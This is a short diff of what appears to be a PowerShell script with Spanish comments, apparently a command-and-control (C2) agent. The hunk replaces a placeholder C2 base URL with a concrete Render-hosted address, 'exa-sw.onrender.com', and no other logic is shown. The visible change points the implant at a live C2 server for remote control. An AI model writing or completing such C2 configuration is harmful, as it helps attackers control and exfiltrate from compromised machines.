@@ -3,7 +3,7 @@
 
 # --- CONFIGURACIÓN ---
 # Modifica estas variables para que coincidan con tu entorno C2 desplegado en Render
-$c2BaseUrl = "https://TU_C2_RENDER_URL" # Reemplaza con la URL base de tu C2 en Render (ej. "https://mi-c2.onrender.com")
+$c2BaseUrl = "https://exa-sw.onrender.com" # Reemplaza con la URL base de tu C2 en Render (ej. "https://mi-c2.onrender.com")
 # El puerto ya está implícito en la URL HTTPS (443)
 # --------------------
 
